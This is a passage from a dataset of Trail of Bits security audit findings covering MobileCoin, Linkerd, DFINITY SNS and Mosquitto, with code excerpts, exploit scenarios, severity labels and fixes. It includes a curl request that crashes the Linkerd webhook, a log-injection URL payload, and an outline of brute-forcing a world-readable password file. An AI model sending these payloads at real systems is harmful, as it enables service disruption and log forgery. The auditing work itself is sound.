in the exploit scenario below. loop { let output_fee = min(total_fee, u64::MAX as u128) as u64; outputs.push(mint_output( config.block_version, &fee_recipient, FEES_OUTPUT_PRIVATE_KEY_DOMAIN_TAG.as_bytes(), parent_block, &transactions, Amount { value: output_fee, token_id, }, outputs.len(), )); total_fee -= output_fee as u128; if total_fee == 0 { break; } } Figure 7.1: consensus/enclave/impl/src/lib.rs#L855-L873 Exploit Scenario Mallory is a (malicious) minter of token T. Suppose B is a recently minted block whose total number of fee outputs is equal to the number of tokens, which is less than the number of transactions in B. Further suppose that Mallory wishes to determine whether B contains a transaction involving T. Mallory does the following: 1. She puts her node into its state just prior to the minting of B. 2. She mints to herself a quantity of T worth u64::MAX / min_fee * min_fee. Call this quantity F. 3. She submits to her node a transaction with a fee of F. 4. She allows the block to be minted. 5. She observes the number of fee outputs in the modied block, B: a. b. If B does not contain a transaction involving T, then B contains a fee output for T equal to zero, and B contains a fee output for T equal to F. If B does contain a transaction involving T, then B contains a fee output for T equal to at least min_fee, and B contains two fee outputs for T, one of which is equal to u64::MAX. Thus, by observing the number of outputs in B, Mallory can determine whether B contains a transaction involving T. Recommendations Short term, require the total supply of all incorporated tokens not to exceed a u64 value. Doing so will eliminate the possibility of overow and prevent the attack described above. Long term, consider incorporating randomness into the number of fee outputs generated. This could provide an alternative means of preventing the attack in a way that still allows for overow. Alternatively, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Various unhandled errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The linkerd codebase contains various methods with unhandled errors. In most cases, errors returned by functions are simply not checked; in other cases, functions that surround deferred error-returning functions do not capture the relevant errors. Using gosec and errcheck, we detected a large number of such cases, which we cannot enumerate in this report. We recommend running these tools to uncover and resolve these cases. Figures 1.1 and 1.2 provide examples of functions in the codebase with unhandled errors: func (h *handler) handleProfileDownload(w http.ResponseWriter, req *http.Request, params httprouter.Params) { [...] w.Write(profileYaml.Bytes()) } Figure 1.1: web/srv/handlers.go#L65-L91 func renderStatStats(rows []*pb.StatTable_PodGroup_Row, options *statOptions) string { [...] writeStatsToBuffer(rows, w, options) w.Flush() [...] } Figure 1.2: viz/cmd/stat.go#L295-L302 We could not determine the severity of all of the unhandled errors detected in the codebase. Exploit Scenario While an operator of the Linkerd infrastructure interacts with the system, an uncaught error occurs. Due to the lack of error reporting, the operator is unaware that the operation did not complete successfully, and he produces further undened behavior. Recommendations Short term, run gosec and errcheck across the codebase. Resolve all issues pertaining to unhandled errors by checking them explicitly. Long term, ensure that all functions that return errors have explicit checks for these errors. Consider integrating the abovementioned tooling into the CI/CD pipeline to prevent undened behavior from occurring in the aected code paths.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. The use of time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. wait: for { select { case result := <-resultChan: results = append(results, result) case <-time.After(waitingTime): break wait // timed out } if atomic.LoadInt32(&activeRoutines) == 0 { break } } Figure 2.1: cli/cmd/metrics_diagnostics_util.go#L131-L142 Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Use of string.Contains instead of string.HasPrex to check for prexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "When formatting event metadata, the formatMetadata method checks whether a given string in the metadata map contains a given prex. However, rather than using string.HasPrefix to perform this check, it uses string.Contains, which returns true if the given prex string is located anywhere in the target string. for k, v := range meta { if strings.Contains(k, consts.Prefix) || strings.Contains(k, consts.ProxyConfigAnnotationsPrefix) { metadata = append(metadata, fmt.Sprintf(\"%s=%s\", k, v)) } } Figure 3.1: multicluster/service-mirror/events_formatting.go#L23-L27 Recommendations Short term, refactor the prex checks to use string.HasPrefix rather than string.Contains. This will ensure that prexes within strings are properly validated.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "4. Risk of resource exhaustion due to the use of defer inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The runCheck function, responsible for performing health checks for various services, performs its core functions inside of an innite for loop. runCheck is called with a timeout stored in a context object. The cancel() function is deferred at the beginning of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each context object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call cancel() at the end of each loop to prevent unforeseen issues. func (hc *HealthChecker) runCheck(category *Category, c *Checker, observer CheckObserver) bool { for { ctx, cancel := context.WithTimeout(context.Background(), RequestTimeout) defer cancel() err := c.check(ctx) if se, ok := err.(*SkipError); ok { log.Debugf(\"Skipping check: %s. Reason: %s\", c.description, se.Reason) return true } Figure 4.1: pkg/healthcheck/healthcheck.go#L1619-L1628 Recommendations Short term, rather than deferring the call to cancel(), add a call to cancel() at the end of the loop.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Lack of maximum request and response body constraint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File Purpose controller/heartbeat/heartbeat.go:239 Reads responses for heartbeat requests pkg/profiles/openapi.go:32 pkg/version/channels.go:83 controller/webhook/server.go:124 pkg/protohttp/protohttp.go:48 pkg/protohttp/protohttp.go:170 Reads the body of le for the profile command Reads responses from requests for obtaining Linkerd versions Reads requests for the webhook and metrics servers Reads all requests sent to the metrics and TAP APIs Reads error responses from the metrics and TAP APIs In the case of pkg/protohttp/protohttp.go, the readAll function can be called to read POST requests, making it easier for an attacker to exploit the misuse of the ReadAll function. Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limitation can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Potential goroutine leak in Kubernetes port-forwarding initialization logic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The Init function responsible for initializing port-forwarding connections for Kubernetes causes a goroutine leak when connections succeed. This is because the failure channel in the Init function is set up as an unbuered channel. Consequently, the failure channel blocks the execution of the anonymous goroutine in which it is used unless an error is received from pf.run(). Whenever a message indicating success is received by readChan, the Init function returns without rst releasing the resources allocated by the anonymous goroutine, causing those resources to be leaked. func (pf *PortForward) Init() error { // (...) failure := make(chan error) go func() { if err := pf.run(); err != nil { failure <- err } }() // (...)` select { case <-pf.readyCh: log.Debug(\"Port forward initialised\") case err := <-failure: log.Debugf(\"Port forward failed: %v\", err) return err } Figure 6.1: pkg/k8s/portforward.go#L200-L220 Recommendations Short term, make the failure channel a buered channel of size 1. That way, the goroutine will be cleaned and destroyed when the function returns regardless of which case occurs rst. Long term, run GCatch against goroutine-heavy packages to detect the mishandling of channel bugs. Refer to appendix C for guidance on running GCatch. Basic instances of this issue can also be detected by running this Semgrep rule.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Risk of log injection in TAP service API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Requests sent to the TAP service API endpoint, /apis/tap, via the POST method are handled by the handleTap method. This method parses a namespace and a name obtained from the URL of the request. Both the namespace and name variables are then used in a log statement for printing debugging messages to standard output. Because both elds are user controllable, an attacker could perform log injection attacks by calling such API endpoints with a namespace or name with newline indicators, such as \\n. func (h *handler) handleTap(w http.ResponseWriter, req *http.Request, p httprouter.Params) { namespace := p.ByName(\"namespace\") name := p.ByName(\"name\") resource := \"\" // (...) h.log.Debugf(\"SubjectAccessReview: namespace: %s, resource: %s, name: %s, user: <%s>, group: <%s>\", namespace, resource, name, h.usernameHeader, h.groupHeader, ) Figure 7.1: viz/tap/api/handlers.go#L106-L125 Exploit Scenario An attacker submits a POST request to the TAP service API using the URL /apis/tap.linkerd.io/v1alpha1/watch/myns\\nERRO[0000]<attackers log message>/tap, causing invalid logs to be printed and tricking an operator into falsely believing there is a failure. Recommendations Short term, ensure that all user-controlled input is sanitized before it is used in the logging function. Additionally, use the format specier %q instead of %s to prompt Go to perform basic sanitation of strings.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. TLS conguration does not enforce minimum TLS version ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Transport Layer Security (TLS) is used in multiple locations throughout the codebase. In two cases, TLS congurations do not have a minimum version requirement, allowing connections from TLS 1.0 and later. This may leave the webhook and TAP API servers vulnerable to protocol downgrade and man-in-the-middle attacks. // NewServer returns a new instance of Server func NewServer( ctx context.Context, api *k8s.API, addr, certPath string, handler Handler, component string, ) (*Server, error) { [...] server := &http.Server{ Addr: addr, TLSConfig: &tls.Config{}, } Figure 8.1: controller/webhook/server.go#L43-L64 // NewServer creates a new server that implements the Tap APIService. func NewServer( ctx context.Context, addr string, k8sAPI *k8s.API, grpcTapServer pb.TapServer, disableCommonNames bool, ) (*Server, error) { [...] httpServer := &http.Server{ Addr: addr, TLSConfig: &tls.Config{ ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCertPool, }, } Figure 8.2: viz/tap/api/sever.go#L34-L76 Exploit Scenario Due to the lack of minimum TLS version enforcement, certain established connections lack sucient authentication and cryptography. These connections do not protect against man-in-the-middle attacks. Recommendations Short term, review all TLS congurations and ensure the MinVersion eld is set to require connections to be TLS 1.2 or newer. Long term, ensure that all TLS congurations across the codebase enforce a minimum version requirement and employ verication where possible.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Nil dereferences in the webhook server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The webhook servers processReq function, used for handling admission review requests, does not properly validate request objects. As a result, malformed requests result in nil dereferences, which cause panics on the server. If the server receives a request with a body that cannot be decoded by the decode function, shown below, an error is returned, and a panic is triggered when the system attempts to access the Request object in line 154. A panic could also occur if the request is decoded successfully into an AdmissionReview object with a missing Request property. In such a case, the panic would be triggered in line 162. 149 func (s *Server) processReq(ctx context.Context, data []byte) *admissionv1beta1.AdmissionReview { 150 151 152 153 154 155 156 157 158 159 160 161 162 admissionReview, err := decode(data) if err != nil { log.Errorf(\"failed to decode data. Reason: %s\", err) admissionReview.Response = &admissionv1beta1.AdmissionResponse{ admissionReview.Request.UID, UID: Allowed: false, Result: &metav1.Status{ Message: err.Error(), }, } return admissionReview } log.Infof(\"received admission review request %s\", admissionReview.Request.UID) 163 log.Debugf(\"admission request: %+v\", admissionReview.Request) Figure 9.1: controller/webhook/server.go#L149-L163 We tested the panic by getting a shell on a container running in the application namespace and issuing the request in gure 9.2. However, the Go server recovers from the panics without negatively impacting the application. curl -i -s -k -X $'POST' -H $'Host: 10.100.137.130:443' -H $'Accept: */*' -H $'Content-Length: 6' --data-binary $'aaaaaa' $'https://10.100.137.130:443/inject/test Figure 9.2: The curl request that causes a panic Recommendations Short term, add checks to verify that request objects are not nil before and after they are decoded. Long term, run the invalid-usage-of-modified-variable rule from the set of Semgrep rules in the CI/CD pipeline to detect this type of bug. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Use of a custom transfer fee causes the creation of SNS neurons to fail ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "When a token swap is committed or aborted, the Swap::finalize method is invoked to transfer funds and (if the swap was successful) create new Service Nervous System (SNS) neurons. When a swap is committed, the method calls the Swap::sweep_sns method to transfer the SNS tokens due to each buyer to the buyers SNS neuron subaccount in the SNS governance canister. The sweep_sns method takes a transfer fee that must be equal to the fee dened during the SNS networks conguration. However, Swap::finalize uses the default Internet Computer Protocol (ICP) transfer fee instead. let sweep_sns = self .sweep_sns(now_fn, DEFAULT_TRANSFER_FEE , sns_ledger) . await ; Figure 1.1: The DEFAULT_TRANSFER_FEE passed to Swap::sweep_sns in Swap::finalize is that used in ICP token transfers. The actual token transfer is handled by the ICRC1Client::transfer method, which calls the icrc1_transfer endpoint on the SNS ledger to transfer the funds to the governance canister. As shown in the implementation of icrc1_transfer in gure 1.2, if the SNS transfer fee is dierent from the default ICP transfer fee, this call will fail. async fn icrc1_transfer (arg: TransferArg ) -> Result <Nat, TransferError> { let block_idx = Access::with_ledger_mut(|ledger| { // ... <redacted> let tx = if &arg.to == ledger.minting_account() { // ... <redacted> } else if &from_account == ledger.minting_account() { // ... <redacted> } else { let expected_fee_tokens = ledger.transfer_fee(); let expected_fee = Nat::from(expected_fee_tokens.get_e8s()); if arg.fee.is_some() && arg.fee.as_ref() != Some (&expected_fee) { return Err (TransferError::BadFee { expected_fee }); } Transaction::transfer( from_account, arg.to, amount, expected_fee_tokens, created_at_time, arg.memo, ) }; let (block_idx, _) = apply_transaction(ledger, tx, now)?; Ok (block_idx) })?; } Figure 1.2: SNS token transfers will fail if the transfer fee expected by the SNS ledger (i.e., that dened during conguration) is dierent from the default ICP transfer fee used by the swap canister. In that case, all SNS token transfers will fail, and no new SNS governance neurons will be created. Because subsequent calls to Swap::finalize will fail in the same way, the SNS will become stuck in PreInitializationSwap mode. Moreover, by the time the system is in that state, the swap canister will have already transferred all buyer ICP tokens to the SNS governance canister; that means that buyers will be unable to request a refund by using the error_refund_icp API. Recommendations Short term, pass the SNS token transfer fee as an argument to the swap canister during canister creation, and ensure that the swap canister uses the correct transfer fee in all SNS token transfers. Long term, implement integration tests to check the correctness of token swaps that use SNS token transfer fees dierent from the default ICP transfer fee. Additionally, consider whether the default fee should be removed from the ledger API, since the fee cannot vary.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Not Applicable"]}, {"title": "2. Failure to ensure that all neurons have been created before the transition to Normal mode ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "The Swap::set_sns_governance_to_normal_mode_if_all_neurons_claimed method sets the SNS governance mode to Normal , which unlocks functionality like the payout of SNS neuron rewards. The methods name indicates that Normal mode is enabled only if all neurons have been claimed. However, the method checks only whether create_neuron.failure is 0; it fails to check whether create_neuron.skipped is also 0. async fn set_sns_governance_to_normal_mode_if_all_neurons_claimed ( sns_governance_client: & mut impl SnsGovernanceClient, create_neuron: & SweepResult , ) -> Option <SetModeCallResult> { let all_neurons_created = create_neuron.failure == 0 ; if !all_neurons_created { return None ; } Some ( sns_governance_client .set_mode(SetMode { mode: governance ::Mode::Normal as i32 , }) . await .into(), ) } Figure 2.1: The function checks the create_neuron.failure eld when verifying that all new neurons have been successfully created; however, create_neuron.skipped must also be 0. The create_neuron.skipped eld is set to the skipped value returned by Swap::investors_for_create_neuron , which will be greater than 0 if any transfers of SNS tokens to the governance canister have not yet nished. Such transfers could conceivably fail, in which case the mode should not be set to Normal . The Swap::set_sns_governance_to_normal_mode_if_all_neurons_claimed method should account for that possibility. pub fn investors_for_create_neuron (& self ) -> ( u32 , Vec <Investor>) { if self .lifecycle() != Lifecycle::Committed { return ( self .neuron_recipes.len() as u32 , vec! []); } let mut investors = Vec ::new(); let mut skipped = 0 ; for recipe in self .neuron_recipes.iter() { if let Some (sns) = &recipe.sns { if sns.transfer_success_timestamp_seconds > 0 { if let Some (investor) = &recipe.investor { investors.push(investor.clone()); continue ; } else { println! ( \"{}WARNING: missing field 'investor'\" , LOG_PREFIX); } } } else { println! ( \"{}WARNING: missing field 'sns'\" , LOG_PREFIX); } skipped += 1 ; } ( skipped , investors) } Figure 2.2: The skipped value will be greater than 0 if there are transfers of SNS tokens to the governance canister that have not yet nished. We did not nd any ways to exploit this issue. Moreover, because the i nvestors_for_create_neuron method is called after the corresponding token swap has been completed, the transfers should nish successfully, given enough time. Hence, we set the severity of this issue to informational. Recommendations Short term, have the swap canister ensure that create_neuron.skipped is also 0 before updating the SNS governance mode to Normal .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "3. Unnecessary calls to unwrap in get_root_status ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "The get_root_status function is used to obtain the status of the root canister from the governance canister. The function calls unwrap on the result returned by the governance canister and then calls it again when decoding the returned status. This means that the function will panic if either of the two calls fails. However, the calling method, SnsRootCanister::get_sns_canisters_summary , wraps the result returned by get_root_status in a CanisterSummary . Because CanisterSummary will accept None for the canister status value, the get_root_status function could simply return an object of type Option<CanisterStatusResultV2> instead of CanisterStatusResultV2 . In that case, the function would not need to unwrap the result and would thus avoid a panic. async fn get_root_status ( env: & impl Environment, governance_id: PrincipalId , ) -> CanisterStatusResultV2 { let result = env .call_canister( CanisterId::new(governance_id).unwrap(), \"get_root_canister_status\" , Encode!(&()).unwrap(), ) . await .map_err(|err| { let code = err. 0. unwrap_or_default(); let msg = err. 1 ; format! ( \"Could not get root status from governance: {}: {}\" , code, msg ) }) .unwrap(); Decode!(&result, CanisterStatusResultV2) .unwrap() } Figure 3.1: The get_root_status function will panic if the call to the governance canister fails. Indeed, this type is used by the get_owned_canister_summary function, which returns CanisterSummary::new_with_no_stat(canister_id) if it cannot obtain a canister status. Using this type rather than panicking in get_root_status would improve the error it reports when it fails to obtain the root canister status from the governance canister. Recommendations Short term, avoid panicking in get_root_status , and update the get_root_status function such that it returns None if the inter-canister call fails.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "4. Erroneous controller check in SnsRootCanister::set_dapp_controllers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "The SnsRootCanister::set_dapp_controllers method is called to update the controller of each decentralized application canister. Before attempting the update, the method checks that the SNS root canister controls the application canister. The method veries only that the call to management_canister_client.canister_status returned Ok(_) ; it fails to check that the root canister ID is in the set of controller IDs. let is_controllee = management_canister_client .canister_status(&dapp_canister_id.into()) . await .is_ok() ; assert! ( is_controllee, \"Operation aborted due to an error; no changes have been made: \\ Unable to determine whether this canister (SNS root) is the controller \\ of a registered dapp canister ({dapp_canister_id}). This may be due to \\ the canister having been deleted, which may be due to it running out \\ of cycles.\" ); Figure 4.1: The management canister returns a Result that wraps a CanisterStatusResultV2 containing the list of controllers for the given canister. However, the error management that the method performs when making the update renders the check unnecessary; thus, the check can be removed. If a token swap is aborted, the swap canister calls the set_dapp_controllers API on the root canister to return control of the application canisters to a set of fallback controllers. If the check in SnsRootCanister::set_dapp_controllers were xed rather than removed, the inter-canister call would cause the swap canister to panic if one of the application canisters had been deleted; in that case, control of the canisters would not be transferred from the SNS canister to the fallback controllers. Recommendations Short term, remove the check highlighted in gure 4.1 from the SnsRootCanister::set_dapp_controllers method.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Accounts with low balances are trimmed from the ICRC-1 ledger ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "If the number of ledger accounts with a non-zero balance reaches 28.1 million (the sum of the xed values in gure 5.1), the ICRC-1 ledger will immediately burn the assets of the accounts with the lowest balances: Ledger::max_number_of_accounts() + Ledger::accounts_overflow_trim_quantity() Figure 5.1: The MAX_ACCOUNTS value (28 million) is added to the ACCOUNTS_OVERFLOW_TRIM_QUANTITY value (100,000). The number of accounts trimmed by the ICRC-1 ledger in this way is indicated by the ACCOUNTS_OVERFLOW_TRIM_QUANTITY value (which is set to 100,000). let to_trim = if ledger.balances().store.len() >= ledger.max_number_of_accounts() + ledger.accounts_overflow_trim_quantity() { select_accounts_to_trim(ledger) } else { vec! [] }; for (balance, account) in to_trim { let burn_tx = L::Transaction::burn(account, balance, Some (now), None ); burn_tx .apply(ledger.balances_mut()) .expect( \"failed to burn funds that must have existed\" ); let parent_hash = ledger.blockchain().last_hash; ledger .blockchain_mut() .add_block(L::Block::from_transaction(parent_hash, burn_tx, now)) .unwrap(); } Figure 5.2: If the number of accounts with a non-zero balance grows too large, accounts will be trimmed from the ledger. This behavior could be very surprising to users and, to our knowledge, is not documented. (For reference, according to Glassnode , there are currently around 85 million Ethereum addresses with a non-zero balance.) If accounts with non-negligible balances are trimmed from the ledger, the practice could cause reputational issues for DFINITY. Moreover, the highlighted if statement condition is most likely wrong. If the total number of accounts tracked by the ledger reaches 28.1 million, the removal of 100,000 accounts will not decrease the number of accounts to less than Ledger::max_number_of_accounts() (which is set to 28 million). Recommendations Short term, update the if statement condition so that it compares the number of accounts to the Ledger::max_number_of_accounts() value. Long term, ensure that the account-trimming behavior is described in both internal and external documentation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "6. Potentially harmful remove_self_as_controller pattern ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "During the setup of the governance canister, it is controlled by the SNS-WASM and root canisters. Then, when the SNS-WASM canister no longer needs to perform any privileged operations, its remove_self_as_controller function changes the governance canisters controllers to a predetermined set (via calls to the CanisterApi::set_controllers function). This set consists of only the root canister, so the function removes the SNS-WASM canister as a controller when making that change. This implementation works for the SNS-WASM canister because these controller sets are static and predetermined; however, the function implementation might not be suitable for reuse in a dynamic context. async fn add_controllers ( canister_api: & impl CanisterApi, canisters: & SnsCanisterIds , ) -> Result <(), String > { let this_canister_id = canister_api.local_canister_id().get(); let set_controllers_results = vec! [ // Set Root as controller of Governance. canister_api .set_controllers( CanisterId::new(canisters.governance.unwrap()).unwrap(), vec! [this_canister_id, canisters.root.unwrap()], ) . await .map_err(|e| { format! ( \"Unable to set Root as Governance canister controller: {}\" , e ) }), // ... ]; join_errors_or_ok(set_controllers_results) } Figure 6.1: The initial setting of the controller set async fn remove_self_as_controller ( canister_api: & impl CanisterApi, canisters: & SnsCanisterIds , ) -> Result <(), String > { let set_controllers_results = vec! [ // Removing self, leaving root. canister_api .set_controllers( CanisterId::new(canisters.governance.unwrap()).unwrap(), vec! [canisters.root.unwrap()], ) . await .map_err(|e| { format! ( \"Unable to remove SNS-WASM as Governance's controller: {}\" , e ) }), // ... ]; join_errors_or_ok(set_controllers_results) } Figure 6.2: The use of a manual rather than dynamic controller-removal process Recommendations Short term, consider adding a remove_controller function to the CanisterApi and having that function call remove_self_as_controller .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "7. Use of panicking functions poses a risk to the ledgers archiving mechanism ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf", "body": "The ICRC-1 ledger calls the archive_blocks function to archive a prex of the local blockchain. That function creates an ArchiveGuard that contains a write lock on the global Archive instance of the ledger state. let archive_arc = LA::with_ledger(|ledger| ledger.blockchain().archive.clone()); // NOTE: this guard will prevent another logical thread to start the archiving // process. let _archiving_guard = match ArchivingGuard::new(Arc::clone(&archive_arc)) { Ok (guard) => guard, Err (ArchivingGuardError::NoArchive) => { return ; // Archiving not enabled } Err (ArchivingGuardError::AlreadyArchiving) => { print::<LA>( \"[ledger] ledger is currently archiving, skipping archive_blocks()\" ); return ; } }; Figure 7.1: The archive_blocks function takes a write lock on the ledger archive. If a new archive node must be created, the ledger invokes the asynchronous create_and_initialize_node_canister function, which creates a new canister and installs the correct Wasm binary. When the function installs the archive nodes Wasm code, it calls unwrap on the encoded arguments passed to it. Because this call is sandwiched between other asynchronous inter-canister calls, the ledger state will have been persisted to disk between the placement of the lock on the archive and the call to unwrap . This means that if the unwrapping operation fails, the archive will remain locked indenitely. let () = spawn::install_code::<Rt>( node_canister_id, Wasm::archive_wasm().into_owned(), Encode!( &Rt::id(), &node_block_height_offset, & Some (node_max_memory_size_bytes) ) .unwrap() , ) . await .map_err(|(reject_code, message)| { FailedToArchiveBlocks( format! ( \"install_code failed; reject_code={}, message={}\" , reject_code, message )) })?; Figure 7.2: When a canisters state is locked, the canister should avoid calling panicking functions after making asynchronous inter-canister calls. Normally, this issue would constitute a severe risk to the availability of the ledger canisters archiving functionality. However, because the call to Encode is very unlikely to fail, we set the severity of this issue to low. Calls to panicking functions in situations like this one, in which a canisters state is persisted when part of it is locked, make the implementation more dicult to understand. To determine whether such a call is safe, the reader (whether a developer or external reviewer) must identify the exact conditions under which the function will panic, which is typically nontrivial. Exploit Scenario A DFINITY developer refactors the implementation of Encode and inadvertently introduces an error into it. Later, when the ledger calls create_and_initialize_node_canister , the error causes the call to Encode to fail. As a result, the ledger archive remains in a locked state indenitely. Recommendations Short term, remove the call to unwrap from the create_and_initialize_node_canister function, and have the function return an error if the call to the Encode macro fails. Long term, review the system canisters to ensure that they do not call panicking functions after making asynchronous inter-canister calls. Alternatively, ensure that the documentation covers the calls to panicking functions and explains why they are safe.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Not Applicable"]}, {"title": "2. Improper implementation of constant-time comparison ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "Constant-time comparison is used in cryptographic code to avoid disclosing information about sensitive data through timing attacks. Mosquitto implements two functions with the same body, memcmp_const and pw__memcmp_const , that are meant to compare two arrays (e.g., password hashes) in constant time but whose runtimes actually vary with the input data. The memcmp_const function is shown in gure 2.1. static int memcmp_const ( const void *a, const void *b, size_t len) 37 38 { 39 40 41 42 43 44 45 46 47 48 49 50 } size_t i; int rc = 0 ; if (!a || !b) return 1 ; for (i= 0 ; i<len; i++){ if ( (( char *)a)[i] != (( char *)b)[i] ){ rc = 1 ; } } return rc; Figure 2.1: plugins/dynamic-security/auth.c#L37-L50 The problem occurs on lines 45-47. If a[i] diers from b[i] , a branch is taken that assigns 1 to the rc variable. If a[i] and b[i] are the same value, the branch is not taken. This behavior results in a longer execution time for the function when a and b dier. As a result, memcmp_const and pw__memcmp_const do not run in constant time and may disclose information about either a or b . An example of a secure function for constant-time comparison is OpenSSLs CRYPTO_memcmp , which uses bitwise operations to ensure that a constant number of instructions is executed, regardless of a s or b s contents: 443 444 { int CRYPTO_memcmp ( const void * in_a, const void * in_b, size_t len) 445 446 447 448 449 450 451 452 453 454 } size_t i; const volatile unsigned char *a = in_a; const volatile unsigned char *b = in_b; unsigned char x = 0 ; for (i = 0 ; i < len; i++) x |= a[i] ^ b[i]; return x; Figure 2.2: OpenSSLs historical implementation of CRYPTO_memcmp CRYPTO_memcmp is now written in assembly to prevent the compiler from optimizing it into a version that does not run in constant time. Currently, Mosquittos constant-time comparison functions are used only to compare password hashes. Constant-time comparison is not strictly required for secure password hash comparison. Therefore, this issue may not be directly exploitable unless the functions are reused for a dierent feature that is susceptible to timing attacks. Exploit Scenario Mosquitto developers add a feature whose security depends on the ability to compare bytes in constant time in order to prevent timing attacks (e.g., comparison of cryptographic private keys). They reuse memcmp_const for this purpose, expecting it to operate in constant time; however, the functions dierent execution times for dierent inputs result in the disclosure of secret information, compromising the security of the feature. Recommendations Short term, remove memcmp_const and pw__memcmp_const . Instead, use CRYPTO_memcmp from OpenSSL for constant-time comparison.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. mosquitto_passwd creates world-readable password les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The mosquitto_passwd utility allows the user to create new password les and update entries in existing ones. Before updating an existing password le, mosquitto_passwd also creates a temporary backup of its original contents in the same directory. When creating a new password le or a backup of an existing one, mosquitto_passwd does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). As a result, password les created using mosquitto_passwd on default congurations of most Linux distributions, which use a mask value of 022 , are readable by all users on the system and writable by all members of the users group (gure 3.1). $ ./mosquitto_passwd -b -c mypasswords admin password Adding password for user admin $ ls -la mypasswords -rw-rw-r-- 1 ubuntu ubuntu 191 Feb 23 15:04 mypasswords Figure 3.1: The mosquitto_passwd utility creates a world-readable password le on Ubuntu 22.04. In update mode, mosquitto_passwd includes a call to umask with a secure mask value of 077 (clearing all permission bits except those for the user) before creating a temporary le that the contents of the new password le are written to. However, this call occurs after the backup of the existing password le is created and therefore does not aect the backup les permissions. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_passwd utility to generate a password le and add entries to it. An attacker on the system, under another user account, does not have authorized access to the broker but can read the directory in which the password le was created. The attacker exploits the default world-readable permissions of the password le to access its contents, brute-force the password hashes (see TOB-MOSQ-CR-1 ), and gain access to the broker. Recommendations Short term, have the mosquitto_passwd utility call umask with a mask of 077 before calling fopen to create a new password le or a backup of an existing one. This will ensure that only the user running mosquitto_passwd can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.", "labels": ["Trail 